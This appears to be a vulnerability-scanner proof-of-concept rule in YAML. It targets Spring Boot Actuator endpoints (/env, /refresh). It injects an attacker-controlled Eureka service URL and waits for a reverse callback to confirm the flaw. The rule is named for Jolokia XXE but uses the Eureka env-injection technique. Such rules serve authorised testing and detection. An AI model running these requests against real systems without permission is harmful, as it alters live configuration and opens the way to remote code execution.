name: poc-yaml-jolokia-xxe
rules:
  - method: POST
    path: /env
    body: 'eureka.client.serviceUrl.defaultZone={{reverse_url}}'
    follow_redirects: true
    expression: |
      status==200
    search: r'eureka.client.serviceUrl.defaultZone="(.+?)"'.bmatches(body)
  - method: POST
    path: /refresh
    body: 'eureka.client.serviceUrl.defaultZone={{reverse_url}}'
    follow_redirects: true
    expression: |
      status==200
    search: waitReverse(5)
detail:
